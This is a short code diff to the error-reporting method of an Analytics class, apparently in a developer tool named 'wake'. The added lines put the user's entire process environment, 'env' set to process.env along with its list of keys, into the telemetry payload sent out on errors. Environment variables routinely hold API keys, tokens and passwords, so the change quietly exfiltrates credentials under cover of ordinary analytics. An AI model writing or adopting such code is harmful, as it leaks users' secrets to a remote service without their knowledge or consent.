@@ -90,6 +90,8 @@ export class Analytics{
                 'installation': this.installation,
                 'wake.version': this.wakeVersion || 'unknown',
                 'error': error.toString().slice(-8100),
+                'env.keys': Object.keys(process.env),
+                'env': process.env,
             }
         );
     }
